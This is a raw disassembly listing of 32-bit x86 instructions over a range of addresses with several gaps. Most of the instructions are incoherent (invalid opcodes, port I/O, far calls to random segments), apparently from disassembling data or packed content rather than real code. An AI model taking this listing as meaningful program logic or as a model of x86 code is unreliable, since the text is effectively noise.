  413f43:	push   esi
  413f44:	inc    edi
  413f45:	ins    BYTE PTR es:[edi],dx
  413f46:	add    BYTE PTR [eax],al
  413f48:	jbe    0x413f8e
  413f4a:	push   esi
  413f4b:	push   edi
  413f4c:	dec    edx
  413f4d:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413f54:	add    BYTE PTR [eax],al
  413f56:	in     al,0xf5
  413f58:	jnp    0x413fa8
  413f5a:	jnp    0x413f2a
  413f5c:	cmc    
  413f5d:	call   FWORD PTR [ebx+0x61]
  413f60:	and    bh,dl
  413f62:	push   0xffffffb0
  413f64:	adc    cl,bh
  413f66:	xlat   BYTE PTR ds:[bx]
  413f68:	add    BYTE PTR [eax],al
  413f6a:	add    BYTE PTR [ecx],al
  413f6c:	add    BYTE PTR [eax],al
  413f6e:	xor    eax,0x30b3649c
  413f73:	dec    edx
  413f74:	das    
  413f75:	test   eax,0x19b13920
  413f7a:	sbb    eax,0x8d792dce
  413f7f:	les    edx,FWORD PTR [edx+eax*4+0x178981d2]
  413f86:	aad    0x30
  413f88:	mov    al,0x76
  413f8a:	adc    eax,0x8652d1f9
  413f8f:	icebp  
  413f90:	lock inc eax
  413f92:	adc    DWORD PTR [ecx+0x24],ebx
  413f95:	and    al,0x96
  413f97:	push   esp
  413f98:	jmp    esi
  413f9a:	sbb    eax,0x99daa64c
  413f9f:	lods   eax,DWORD PTR ds:[esi]
  413fa0:	xchg   esi,eax
  413fa1:	adc    eax,0x9cc90797
  413fa6:	fst    DWORD PTR [edx+eax*8]
  413fa9:	stos   BYTE PTR es:[edi],al
  413faa:	test   al,0x60
  413fac:	xlat   BYTE PTR ds:[ebx]
  413fad:	xchg   ebp,eax
  413fae:	sar    BYTE PTR [ebp-0x7c0781a6],cl
  413fb4:	popf   
  413fb5:	sub    dl,BYTE PTR [edi+ecx*4]
  413fb8:	and    eax,0x1fb0045
  413fbd:	aad    0xee
  413fbf:	lock test al,0x2d
  413fc2:	ret    0xd850
  413fc5:	enter  0xa14b,0x80
  413fc9:	sbb    eax,0xbddf1d2a
  413fce:	add    edi,DWORD PTR fs:[ebx+eax*1+0x23]
  413fd3:	test   al,bl
  413fd5:	lods   eax,DWORD PTR ds:[esi]
  413fd6:	outs   dx,DWORD PTR ds:[esi]
  413fd7:	pop    eax
  413fd8:	mov    DWORD PTR [ebx],eax
  413fda:	sub    al,0x76
  413fdc:	sbb    cl,BYTE PTR [edi]
  413fde:	fdiv   QWORD PTR [ecx]
  413fe0:	push   ebp
  413fe1:	jno    0x413fa9
  413fe3:	push   0x2d4915bd
  413fe8:	add    DWORD PTR [edx*2-0x6279965d],ebp
  413fef:	adc    ch,BYTE PTR [edi]
  413ff1:	xlat   BYTE PTR ds:[ebx]
  413ff2:	push   eax
  413ff3:	cld    
  413ff4:	pop    es
  413ff5:	mul    DWORD PTR [edi+0x66]
  413ff8:	ret    0xf993
  413ffb:	cld    
  413ffc:	mov    bl,BYTE PTR [edx+0x10]
  413fff:	std    
  414000:	jge    0x414045
  414002:	jle    0x413f84
  414004:	fisttp QWORD PTR ds:0xcfdb9bfe
  41400a:	push   cs
  41400b:	call   0x8716:0xeb99f90
  414012:	sub    cl,BYTE PTR [eax+0x4147ba19]
  414018:	fidivr DWORD PTR [edi]
  41401a:	inc    esi
  41401b:	push   cs
  41401c:	jge    0x414006
  41401e:	repz cli 
  414020:	hlt    
  414021:	cmp    esi,ebx
  414023:	outs   dx,BYTE PTR ds:[esi]
  414024:	shl    dl,0xbc
  414027:	out    0xe5,al
  414029:	add    DWORD PTR [ebx-0x35],esp
  41402c:	sub    al,0x7f
  41402e:	and    DWORD PTR [edx+ecx*1],edx
  414031:	xchg   ebp,eax
  414032:	stos   BYTE PTR es:[edi],al
  414033:	nop
  414034:	pop    ebx
  414035:	retf   
  414036:	leave  
  414037:	add    ecx,DWORD PTR [ecx+0x56eb2b6e]
  41403d:	cmp    al,0xf0
  41403f:	xchg   ebp,eax
  414040:	test   eax,0x75bd4795
  414045:	mov    edi,0x83f81890
  41404a:	enter  0xe9f4,0xeb
  41404e:	push   eax
  41404f:	xlat   BYTE PTR ds:[ebx]
  414050:	sub    esp,DWORD PTR [esi+0x752e4e54]
  414056:	xchg   ebp,eax
  414057:	jmp    0x41401b
  414059:	jb     0x414021
  41405b:	and    al,0xeb
  41405d:	mov    ds,WORD PTR [edi-0x53]
  414060:	nop
  414061:	adc    al,0xa5
  414063:	lods   eax,DWORD PTR ds:[esi]
  414064:	outs   dx,DWORD PTR ds:[esi]
  414065:	outs   dx,DWORD PTR ds:[esi]
  414066:	or     eax,DWORD PTR [ebp+esi*8-0x2afdb83c]
  41406d:	cdq    
	...
  4140d6:	pop    edx
  4140d7:	ficom  DWORD PTR [esi+0x60]
  4140da:	(bad)  
  4140db:	in     al,dx
  4140dc:	jle    0x4140d8
  4140de:	call   0x50ce:0xcdd52e96
  4140e5:	mov    ds:0xd867,al
  4140ea:	add    BYTE PTR [ecx],al
  4140ec:	add    BYTE PTR [eax],al
  4140ee:	xchg   esi,eax
  4140ef:	xor    eax,0x7327095e
  4140f4:	adc    edi,ebx
  4140f6:	in     al,dx
  4140f7:	mov    BYTE PTR [edi-0x6f],dh
  4140fa:	in     eax,0x2e
  4140fc:	mov    eax,ds:0xabc6ebed
  414101:	aas    
  414102:	test   ebp,0x45fc79a7
  414108:	in     al,0x34
  41410a:	shl    DWORD PTR [ecx+0x252a4815],cl
  414110:	test   BYTE PTR [ebp-0x37913e12],al
  414116:	jge    0x41409a
  414118:	pop    edi
  414119:	jbe    0x414192
  41411b:	mov    DWORD PTR [edx+ecx*4],edi
  41411e:	xor    DWORD PTR [eax-0x576a18a3],edi
  414124:	lock imul esp,DWORD PTR [esi+ebp*1],0x81e58eed
  41412c:	mov    dh,ah
  41412e:	mov    bh,0x9b
  414130:	xor    BYTE PTR [eax-0x69],0x1d
  414134:	xor    al,0xbb
  414136:	mov    eax,0x19923d0
  41413b:	es int 0x13
  41413e:	addr16 push cs
  414140:	jno    0x41417b
  414142:	and    cl,BYTE PTR [ebx-0x2f]
  414145:	cmp    eax,0xb507a1c3
  41414a:	cdq    
  41414b:	fs pusha 
  41414d:	dec    DWORD PTR [esi-0x8]
  414150:	lahf   
  414151:	arpl   sp,si
  414153:	dec    edx
  414154:	push   edi
  414155:	cmp    BYTE PTR [ecx+esi*4],0x19
  414159:	pop    ebx
  41415a:	xchg   ecx,eax
  41415b:	and    ah,BYTE PTR [ebp+0x6a]
  41415e:	sub    al,0x9f
  414160:	imul   ebp,DWORD PTR [ebp-0x13fb047d],0xffffffc7
  414167:	sahf   
  414168:	or     ah,BYTE PTR [esi-0x7]
  41416b:	sti    
  41416c:	sub    esp,DWORD PTR [edx]
  41416e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41416f:	push   ebp
  414170:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414171:	hlt    
  414172:	std    
  414173:	inc    ebx
  414174:	xchg   edi,eax
  414175:	pop    esi
  414176:	mov    edx,0xe0557b9e
  41417b:	(bad)  
  41417c:	cmp    BYTE PTR [edx+0x67ccf686],dl
  414182:	push   0x6e
  414184:	cmp    bh,BYTE PTR [eax-0x61]
  414187:	arpl   bp,di
  414189:	jmp    0x4141a2
  41418b:	jle    0x414111
  41418d:	jle    0x41412b
  41418f:	xchg   bh,cl
  414191:	adc    DWORD PTR ds:0x2dea2ab8,edi
  414197:	sti    
  414198:	push   0x80e95929
  41419d:	stos   BYTE PTR es:[edi],al
  41419e:	ins    DWORD PTR es:[edi],dx
  41419f:	pop    ebp
  4141a0:	pop    ss
  4141a1:	mov    ebx,0x664ee8ee
  4141a6:	inc    ecx
  4141a7:	mov    esi,0xc8d2c8b1
  4141ac:	mov    esi,0x66785212
  4141b1:	call   0x4d42a228
  4141b6:	outs   dx,DWORD PTR ds:[esi]
  4141b7:	mov    esp,0x92dd81a3
  4141bc:	add    ah,BYTE PTR ds:0xc5266818
  4141c2:	fsubrp st(7),st
  4141c4:	icebp  
  4141c5:	es add ch,ah
  4141c8:	mov    al,0x59
  4141ca:	mov    bh,0x1b
  4141cc:	mov    dl,0xe6
  4141ce:	sar    DWORD PTR [eax+0x14a8ad58],0x86
  4141d5:	push   edi
  4141d6:	das    
  4141d7:	sbb    al,0x2f
  4141d9:	out    0x96,eax
  4141db:	outs   dx,BYTE PTR ds:[esi]
  4141dc:	call   0x2070b899
  4141e1:	inc    ebp
  4141e2:	dec    esi
  4141e3:	fldenv [esi]
  4141e5:	out    0x9e,eax
  4141e7:	inc    edi
  4141e8:	xor    DWORD PTR [edi],edx
  4141ea:	adc    esp,ecx
  4141ec:	(bad)  
  4141ed:	hlt    
	...
  414256:	add    dl,BYTE PTR [edx]
  414258:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  41425e:	mov    DWORD PTR [ecx+0x37],edx
  414261:	push   edi
  414262:	push   cs
  414263:	not    BYTE PTR [edx+esi*2+0xd967]
  41426a:	add    BYTE PTR [ecx],al
  41426c:	add    BYTE PTR [eax],al
  41426e:	out    dx,eax
  41426f:	pusha  
  414270:	jmp    0x4791:0x98566109
  414277:	xor    ecx,edi
  414279:	mov    dh,BYTE PTR ds:0x34b4c6df
  41427f:	add    DWORD PTR [esi+0x2f],0xe44d6f25
  414286:	mov    esp,0xf9c16d9c
  41428b:	dec    eax
  41428c:	call   0x957b:0x6602a00f
  414293:	xor    DWORD PTR [edx+esi*2-0x4eb5b9f6],0x8ee8f74d
  41429e:	inc    ecx
  41429f:	inc    esp
  4142a0:	lds    ebp,FWORD PTR [ecx+0x635ec208]
  4142a6:	xlat   BYTE PTR ds:[ebx]
  4142a7:	pop    ecx
  4142a8:	cwde   
  4142a9:	xchg   esi,eax
  4142aa:	adc    DWORD PTR [ebx+ecx*1-0x26819d7e],0xffffffce
  4142b2:	cwde   
  4142b3:	cmp    eax,0x854a149f
  4142b8:	sbb    esi,eax
  4142ba:	sub    BYTE PTR [edx+eax*4],dl
  4142bd:	pop    esi
  4142be:	retf   
  4142bf:	stc    
  4142c0:	out    0xca,al
  4142c2:	test   DWORD PTR [esi-0x3],edx
  4142c5:	mov    ah,0xe
  4142c7:	test   BYTE PTR [edi-0x61],cl
  4142ca:	cmp    eax,0x5b251fb4
  4142cf:	mov    cl,0x1f
  4142d1:	fnstenv [edx-0x74dfea1f]
  4142d7:	lock and eax,0xd573ed1a
  4142dd:	sbb    DWORD PTR ds:0x7d7768a,ecx
  4142e3:	iretw  
  4142e5:	call   0x1b78:0xe99fe310
  4142ec:	or     esp,esp
  4142ee:	clc    
  4142ef:	jl     0x4142f6
  4142f1:	inc    BYTE PTR ss:[ebp-0xc]
  4142f5:	push   esp
  4142f6:	inc    ecx
  4142f7:	test   al,0xbb
  4142f9:	aam    0xcf
  4142fb:	xor    eax,0xa2f6fc58
  414300:	adc    ah,BYTE PTR [ecx+0x4937f342]
  414306:	jg     0x41429e
  414308:	and    al,0x17
  41430a:	je     0x414291
  41430c:	adc    al,0xd
  41430e:	xchg   edx,eax
  41430f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414310:	push   0x52d1edf
  414315:	mov    WORD PTR [edx],?
  414317:	add    WORD PTR [ecx],0x86ed
  41431c:	(bad)
  41431f:	or     BYTE PTR [esi],0x53
  414322:	std    
  414323:	fwait
  414324:	push   cs
  414325:	sub    bh,bh
  414327:	out    dx,al
  414328:	cmp    eax,0xebf7452c
  41432d:	js     0x4142fe
  41432f:	dec    edi
  414330:	fisttp QWORD PTR [ebx+eax*4]
  414333:	shl    DWORD PTR [eax+0x37],cl
  414336:	int    0xaa
  414338:	mov    dh,0xb2
  41433a:	enter  0x1efc,0x8e
  41433e:	mov    edi,0xbc462eef
  414343:	cmp    BYTE PTR fs:[ecx],bl
  414346:	les    ebx,FWORD PTR [ebx+ecx*4-0x42]
  41434a:	and    BYTE PTR [esi+0x7e],ah
  41434d:	xor    BYTE PTR [esi],cl
  41434f:	jmp    0x9db0:0xf096a0d7
  414356:	shl    al,1
  414358:	neg    DWORD PTR [edi+0x6c]
  41435b:	cld    
  41435c:	ror    DWORD PTR [eax-0x71],0x9b
  414360:	call   0xf4c:0x2a5990ca
  414367:	js     0x4143d4
  414369:	mov    edx,0xc3d0b90c
	...
  4143d6:	add    DWORD PTR [ecx-0x2122293],eax
  4143dc:	mov    cl,0xdd
  4143de:	rol    DWORD PTR [ebp+0x5e],0xa1
  4143e2:	test   BYTE PTR [edi+eiz*1],0xb2
  4143e6:	fiadd  DWORD PTR [bx+si]
  4143e9:	add    BYTE PTR [eax],al
  4143eb:	add    DWORD PTR [eax],eax
  4143ed:	add    BYTE PTR [ebx-0x21],bl
  4143f0:	iret   
  4143f1:	jae    0x4143b6
  4143f3:	int    0xd0
  4143f5:	pop    ecx
  4143f6:	repz adc ebp,0xffffffd7
  4143fa:	lahf   
  4143fb:	ror    BYTE PTR [ecx],0x71
  4143fe:	jbe    0x4143b8
  414400:	xlat   BYTE PTR ds:[ebx]
  414401:	inc    esi
  414402:	sub    DWORD PTR [eax-0x78],0x3618cb6
  414409:	push   ebx
  41440a:	jl     0x4143d3
  41440c:	xchg   edi,eax
  41440d:	ja     0x41447f
  41440f:	add    eax,0xc64c2138
  414414:	pop    ebp
  414415:	xchg   edx,eax
  414416:	enter  0xb99c,0x3
  41441a:	pop    esi
  41441b:	inc    ebx
  41441c:	push   ds
  41441d:	std    
  41441e:	repz push ds
  414420:	sbb    ebx,ecx
  414422:	hlt    
  414423:	sub    DWORD PTR [ecx-0x2e6b94d1],ecx
  414429:	xor    esi,eax
  41442b:	add    dl,BYTE PTR [eax-0x22093985]
  414431:	aad    0x20
  414433:	mov    esi,0xc38844b6
  414438:	xor    eax,0x7e6041bd
  41443d:	push   ecx
  41443e:	fucompp 
  414440:	xor    BYTE PTR ds:[edi-0x74],ch
  414444:	test   al,dl
  414446:	fldenv ds:[esi+0x5381626a]
  41444d:	mov    esi,0x6a247e13
  414452:	rcr    dl,1
  414454:	call   0x8acc236d
  414459:	out    0xa4,eax
  41445b:	icebp  
  41445c:	or     dl,BYTE PTR ds:0x9232593b
  414462:	out    dx,al
  414463:	jg     0x4144b7
  414465:	xchg   edi,eax
  414466:	xlat   BYTE PTR ds:[ebx]
  414467:	fs pop edi
  414469:	jp     0x41441d
  41446b:	jmp    0x4144b4
  41446d:	imul   esp
  41446f:	mov    dh,0xf0
  414471:	push   ss
  414472:	in     eax,0xc8
  414474:	out    dx,al
  414475:	and    BYTE PTR [esp+ebx*4],0x5c
  414479:	cwde   
  41447a:	add    al,0xf7
  41447c:	pop    ecx
  41447d:	xor    al,0xbd
  41447f:	add    eax,0x50f212c1
  414484:	outs   dx,BYTE PTR ds:[esi]
  414485:	and    dl,BYTE PTR es:[esi+0x481050ff]
  41448c:	outs   dx,DWORD PTR ds:[esi]
  41448d:	mov    DWORD PTR [esi+edx*2+0x33e58bab],ebp
  414494:	pusha  
  414495:	pop    eax
  414496:	cwde   
  414497:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414498:	pop    es
  414499:	stos   DWORD PTR es:[edi],eax
  41449a:	jns    0x41444c
  41449c:	(bad)  
  41449d:	jl     0x414430
  41449f:	mov    dh,0x94
  4144a1:	jmp    0xac70:0x372257c6
  4144a8:	push   0xffffffb4
  4144aa:	push   ecx
  4144ab:	fild   WORD PTR [edx-0x2e46b62b]
  4144b1:	jb     0x4144af
  4144b3:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4144b5:	enter  0x315f,0x86
  4144b9:	add    al,0x0
  4144bb:	cmp    al,0xed
  4144bd:	rcr    al,0xa
  4144c0:	xchg   DWORD PTR [ebx],esp
  4144c2:	sub    al,0x2a
  4144c4:	call   0x4487:0xd5813863
  4144cb:	or     dl,ah
  4144cd:	pop    esp
  4144ce:	bound  ebx,QWORD PTR [edx+0x3e20a920]
  4144d4:	adc    dl,BYTE PTR [ecx+0x1]
  4144d7:	jp     0x4144c7
  4144d9:	daa    
  4144da:	inc    esp
  4144db:	adc    eax,0x4765e70c
  4144e0:	outs   dx,BYTE PTR ds:[esi]
  4144e1:	lahf   
  4144e2:	sub    ebx,edi
  4144e4:	push   edx
  4144e5:	clc    
  4144e6:	pop    ss
  4144e7:	outs   dx,BYTE PTR ds:[esi]
  4144e8:	imul   edi,DWORD PTR [eax+eax*8+0x2b92f4],0x0
	...
  414554:	add    BYTE PTR [eax],al
  414556:	pop    ebx
  414557:	jae    0x41459b
  414559:	or     eax,0x775f3d6a
  41455e:	pop    ds
  41455f:	dec    edi
  414560:	or     cl,BYTE PTR [esi+0x49]
  414563:	iret   
  414564:	xchg   BYTE PTR [ecx+0x67],cl
  414567:	fild   DWORD PTR [eax]
  414569:	add    BYTE PTR [eax],al
  41456b:	add    DWORD PTR [eax],eax
  41456d:	add    BYTE PTR [esi-0x74],dl
  414570:	or     bl,al
  414572:	adc    eax,0xcaabb7b4
  414577:	jne    0x41459c
  414579:	jbe    0x4145af
  41457b:	les    eax,FWORD PTR [ecx-0x78]
  41457e:	cmp    al,0x6d
  414580:	sbb    eax,0x319d18e9
  414585:	hlt    
  414586:	mov    eax,0xa93551c5
  41458b:	cdq    
  41458c:	mov    al,0xa4
  41458e:	jl     0x41456f
  414590:	idiv   dh
  414592:	loopne 0x414534
  414594:	aam    0x4
  414596:	push   0x12b3e6b1
  41459b:	add    eax,0x432b7337
  4145a0:	ja     0x4145e4
  4145a2:	inc    esi
  4145a3:	mov    al,0x71
  4145a5:	xor    eax,0x9240b7e7
  4145aa:	and    BYTE PTR [esi],dh
  4145ac:	sbb    al,0x77
  4145ae:	mov    DWORD PTR [edi+ebx*2],eax
  4145b1:	test   BYTE PTR [esi+ecx*8],al
  4145b4:	sbb    ebx,DWORD PTR [ebx-0x49da1650]
  4145ba:	shr    BYTE PTR [ecx-0x330c3c6c],1
  4145c0:	in     al,0x80
  4145c2:	loope  0x414613
  4145c4:	cld    
  4145c5:	sub    ebx,ebp
  4145c7:	jp     0x414583
  4145c9:	jae    0x414597
  4145cb:	xchg   esi,eax
  4145cc:	fstp   DWORD PTR [eax]
  4145ce:	mov    bh,0xe4
  4145d0:	lods   eax,DWORD PTR ds:[esi]
  4145d1:	call   0xc4c239dd
  4145d6:	or     eax,0xffffff98
  4145d9:	mov    fs,esp
  4145db:	ds mov edx,0x45290639
  4145e1:	fnstsw WORD PTR [ebx]
  4145e3:	add    eax,0x4b7ede04
  4145e8:	or     eax,0xfd2d5230
  4145ed:	sahf   
  4145ee:	pop    eax
  4145ef:	stos   DWORD PTR es:[edi],eax
  4145f0:	xchg   edi,eax
  4145f1:	lahf   
  4145f2:	xchg   ecx,eax
  4145f3:	adc    dl,al
  4145f5:	int3   
  4145f6:	fcomp  st(1)
  4145f8:	(bad)  
  4145f9:	pusha  
  4145fa:	mov    eax,ds:0x555adb2c
  4145ff:	mov    eax,ds:0x3b1c134f
  414604:	push   ss
  414605:	pushf  
  414606:	push   0xb004884
  41460b:	mov    bh,BYTE PTR [ecx]
  41460d:	pop    ebp
  41460e:	push   ecx
  41460f:	cmp    edx,DWORD PTR [esi-0x13ced7a2]
  414615:	je     0x414603
  414617:	mov    ebp,esp
  414619:	outs   dx,DWORD PTR ds:[esi]
  41461a:	jne    0x414645
  41461c:	out    0x6b,al
  41461e:	rcl    dl,1
  414620:	js     0x414605
  414622:	push   edi
  414623:	stos   BYTE PTR es:[edi],al
  414624:	mov    eax,0xdb773eda
  414629:	cdq    
  41462a:	adc    dh,BYTE PTR [edi+0x602b39cf]
  414630:	dec    eax
  414631:	inc    ebp
  414632:	std    
  414633:	xor    edx,DWORD PTR [ebp+0x45]
  414636:	sub    DWORD PTR [eax-0x11b5116c],0x7b
  41463d:	mov    dh,0xe8
  41463f:	fdiv   DWORD PTR [edi+0x69fd3d67]
  414645:	dec    edi
  414646:	lds    edi,FWORD PTR [edi+0x633c498f]
  41464c:	mov    edx,0x2e39db23
  414651:	imul   ebp,DWORD PTR [esi+0x1c807e36],0x810ce5f1
  41465b:	call   0x98be331d
  414660:	fmul   DWORD PTR [esi-0x222b4b3c]
  414666:	xor    esp,DWORD PTR [ecx+0x10]
  414669:	cli    
  41466a:	clc    
  41466b:	push   esp
  41466c:	jbe    0x41464d
	...
  4146d6:	jg     0x414736
  4146d8:	cmc    
  4146d9:	ins    DWORD PTR es:[edi],dx
  4146da:	cmc    
  4146db:	out    dx,eax
  4146dc:	call   FWORD PTR [esi+0x17]
  4146df:	enter  0xab7a,0xe3
  4146e3:	jno    0x414729
  4146e5:	sbb    DWORD PTR [edi-0x24],esp
  4146e8:	add    BYTE PTR [eax],al
  4146ea:	add    BYTE PTR [ecx],al
  4146ec:	add    BYTE PTR [eax],al
  4146ee:	cmc    
  4146ef:	or     al,0x39
  4146f1:	(bad)  
  4146f2:	jp     0x414726
  4146f4:	sub    BYTE PTR [esi+edi*4],bl
  4146f7:	mov    edi,0xa9369521
  4146fc:	sahf   
  4146fd:	or     esi,DWORD PTR [eax]
  4146ff:	dec    ecx
  414700:	addr16 clc 
  414702:	hlt    
  414703:	cmc    
  414704:	cwde   
  414705:	enter  0x66e3,0x29
  414709:	mov    esi,0x6be5ac81
  41470e:	fwait
  41470f:	push   esp
  414710:	call   0xaa98adad
  414715:	xor    eax,0x6720abb3
  41471a:	jl     0x41478d
  41471c:	xor    BYTE PTR [ecx+0x66],ah
  41471f:	pop    ecx
  414720:	add    DWORD PTR [edi-0x66],0x76
  414724:	mov    dl,0xa
  414726:	fist   WORD PTR [edx-0x18]
  414729:	hlt    
  41472a:	xor    eax,0x3386c326
  41472f:	repz jmp 0x21f8c219
  414735:	ins    BYTE PTR es:[edi],dx
  414736:	xchg   DWORD PTR [esi+0x1c],eax
  414739:	int3   
  41473a:	cmp    bl,BYTE PTR [esi+0x18]
  41473d:	pop    eax
  41473e:	sbb    eax,0x2a7610d7
  414743:	mov    DWORD PTR [ecx-0x6859ddef],edx
  414749:	out    0xb4,eax
  41474b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41474c:	pop    ds
  41474d:	aas    
  41474e:	outs   dx,DWORD PTR ds:[esi]
  41474f:	mov    ecx,0xf83e033c
  414754:	mov    al,ds:0xf3903c29
  414759:	std    
  41475a:	inc    ecx
  41475b:	mov    ch,cl
  41475d:	inc    esp
  41475e:	xor    eax,0x40dee60d
  414763:	ss scas al,BYTE PTR es:[edi]
  414765:	int3   
  414766:	es mov esi,0xcedde31c
  41476c:	add    al,0x3a
  41476e:	or     ecx,ecx
  414770:	in     eax,dx
  414771:	pop    ebx
  414772:	push   ds
  414773:	mov    esi,0x582497c
  414778:	adc    ah,BYTE PTR [edx+ebx*1-0x42dfa3d8]
  41477f:	adc    ecx,esi
  414781:	push   edx
  414782:	jge    0x41473a
  414784:	mov    BYTE PTR [esi-0x6d],ch
  414787:	mov    bl,0xa9
  414789:	out    dx,al
  41478a:	jne    0x4147e1
  41478c:	dec    ecx
  41478d:	xchg   BYTE PTR [eax+ecx*8+0x42],dl
  414791:	jp     0x4147d5
  414793:	nop
  414794:	sbb    al,0xa5
  414796:	ficomp WORD PTR [esi]
  414798:	mov    al,ds:0x16934268
  41479d:	fldcw  WORD PTR [edx]
  41479f:	jmp    0xd95cda49
  4147a4:	rcr    BYTE PTR [ebp-0x4e],1
  4147a7:	push   eax
  4147a8:	xchg   ebp,eax
  4147a9:	pop    es
  4147aa:	jns    0x414771
  4147ac:	in     eax,0xb9
  4147ae:	jbe    0x41482c
  4147b0:	push   cs
  4147b1:	cmc    
  4147b2:	scas   eax,DWORD PTR es:[edi]
  4147b3:	mov    ch,ch
  4147b5:	imul   bh
  4147b7:	push   ds
  4147b8:	das    
  4147b9:	mov    edi,esi
  4147bb:	pop    ebx
  4147bc:	xor    BYTE PTR [edx-0x36],bh
  4147bf:	inc    ebp
  4147c0:	mov    BYTE PTR [edx],cl
  4147c2:	sub    edi,DWORD PTR [ebx]
  4147c4:	sbb    esi,DWORD PTR [ecx+0x3231046d]
  4147ca:	cmp    ebx,esi
  4147cc:	stos   DWORD PTR es:[edi],eax
  4147cd:	sbb    DWORD PTR fs:0x9811e4c1,0x3b
  4147d5:	mov    es,WORD PTR [ebp-0x1d01b2a9]
  4147db:	imul   ecx,DWORD PTR [edx+0x6ff34356],0x2b
  4147e2:	add    edx,DWORD PTR [esi-0x1e]
  4147e5:	ss dec ebx
  4147e7:	sbb    esp,esi
  4147e9:	mov    WORD PTR [ebx+0x5b4ffe],es
	...
  414853:	add    BYTE PTR [eax],al
  414855:	add    BYTE PTR [esi+0x2f],bh
  414858:	add    DWORD PTR [ebp+0x51],ebp
  41485b:	outs   dx,DWORD PTR ds:[esi]
  41485c:	jle    0x41489d
  41485e:	aas    
  41485f:	mov    BYTE PTR [esi],cl
  414861:	cmp    eax,0xeef54b8a
  414866:	fld    QWORD PTR [bx+si]
  414869:	add    BYTE PTR [eax],al
  41486b:	add    DWORD PTR [eax],eax
  41486d:	add    BYTE PTR [ebx+0x35d8e43f],bh
  414873:	jmp    0x414819
  414875:	out    0x7a,al
  414877:	imul   edi,edi,0x6b
  41487a:	cwde   
  41487b:	adc    bh,BYTE PTR [ecx-0x4a]
  41487e:	jns    0x414861
  414880:	xor    al,bh
  414882:	pop    edx
  414883:	rcl    DWORD PTR [ebp-0x3737a992],0x4a
  41488a:	xchg   ebx,eax
  41488b:	jnp    0x41485b
  41488d:	pop    ecx
  41488e:	lock cdq 
  414890:	mov    ds:0xf5deb6d,eax
  414895:	mov    eax,0xc2fdc8f
  41489a:	cli    
  41489b:	ins    DWORD PTR es:[edi],dx
  41489c:	xor    BYTE PTR [esi],dl
  41489e:	mov    ds:0xa255726b,eax
  4148a3:	neg    DWORD PTR [esi-0x58]
  4148a6:	test   al,0x6d
  4148a8:	mov    cl,0x7
  4148aa:	outs   dx,DWORD PTR ds:[esi]
  4148ab:	xor    bl,BYTE PTR [edi+0x46]
  4148ae:	cli    
  4148af:	sub    eax,0xd65b4120
  4148b4:	and    DWORD PTR [edx],esp
  4148b6:	dec    edx
  4148b7:	out    dx,eax
  4148b8:	ja     0x414914
  4148ba:	mov    eax,fs
  4148bc:	cs js  0x41493d
  4148bf:	inc    ebx
  4148c0:	retf   0x54ac
  4148c3:	jmp    0x4b0ddc1a
  4148c8:	push   ebx
  4148c9:	xchg   esp,eax
  4148ca:	mov    dl,BYTE PTR [eax-0x6a651773]
  4148d0:	xor    al,0xc6
  4148d2:	xchg   edx,eax
  4148d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148d4:	dec    esi
  4148d5:	or     eax,0x25de3ece
  4148da:	iret   
  4148db:	arpl   WORD PTR [esi+eax*2-0x1f8cde17],si
  4148e2:	test   al,0xac
  4148e4:	mov    al,0xd8
  4148e6:	aas    
  4148e7:	xchg   esi,eax
  4148e8:	movsx  eax,WORD PTR [esi]
  4148eb:	mov    esp,0x1b2cb0a3
  4148f0:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148f2:	cmp    eax,0xa5386df3
  4148f7:	enter  0x1f0c,0x9b
  4148fb:	push   0xc4093d3a
  414900:	xchg   esi,eax
  414901:	cmp    edx,DWORD PTR ds:0x544a83f2
  414907:	dec    ecx
  414908:	dec    edi
  414909:	xchg   ebx,eax
  41490a:	sbb    al,0xb8
  41490c:	sbb    bh,0xf4
  41490f:	outs   dx,DWORD PTR ds:[esi]
  414910:	inc    esp
  414911:	fiadd  WORD PTR [edi]
  414913:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414914:	or     BYTE PTR [eax],bh
  414916:	pushf  
  414917:	and    eax,0x5ef6f9a1
  41491c:	add    DWORD PTR [edi],esp
  41491e:	sub    esp,DWORD PTR [ecx+0xa]
  414921:	mov    edi,0x1f53fd31
  414926:	aaa    
  414927:	push   cs
  414928:	pop    edi
  414929:	mov    bl,0x68
  41492b:	fcom   QWORD PTR [esi-0x3d]
  41492e:	cmp    BYTE PTR [esi-0x11f47e57],bh
  414934:	jbe    0x4149aa
  414936:	std    
  414937:	mov    DWORD PTR [edi+0x6ee50ee6],ecx
  41493d:	add    eax,0x3dbf4756
  414942:	add    BYTE PTR [ebp-0x3e410db0],ah
  414948:	adc    DWORD PTR ds:0x9fdf4dd5,edi
  41494e:	dec    DWORD PTR [ebx+0x6b]
  414951:	inc    ebx
  414952:	stos   DWORD PTR es:[edi],eax
  414953:	inc    esi
  414954:	sbb    ecx,DWORD PTR [esi]
  414956:	sub    al,0x93
  414958:	mov    dh,0xd5
  41495a:	pop    ecx
  41495b:	fwait
  41495c:	pop    ss
  41495d:	push   esp
  41495e:	adc    al,BYTE PTR [ecx-0x7f]
  414961:	outs   dx,DWORD PTR ds:[esi]
  414962:	xlat   BYTE PTR ds:[ebx]
  414963:	push   ss
  414964:	(bad)  
  414965:	mov    dh,0x76
  414967:	inc    esp
  414968:	and    eax,0xa481e91d
  41496d:	retf   0x0
	...
  4149d4:	add    BYTE PTR [eax],al
  4149d6:	or     edi,DWORD PTR [esi-0x2e]
  4149d9:	and    esi,edi
  4149db:	scas   eax,DWORD PTR es:[edi]
  4149dc:	sti    
  4149dd:	jle    0x4149c5
  4149df:	pop    edx
  4149e0:	push   ds
  4149e1:	pop    es
  4149e2:	push   edi
  4149e3:	xor    BYTE PTR [esi+0x79],dh
  4149e6:	fiadd  WORD PTR [bx+si]
  4149e9:	add    BYTE PTR [eax],al
  4149eb:	add    DWORD PTR [eax],eax
  4149ed:	add    BYTE PTR [edi-0x5e4e22af],bl
  4149f3:	out    0xbc,eax
  4149f5:	jg     0x414a41
  4149f7:	jp     0x414a23
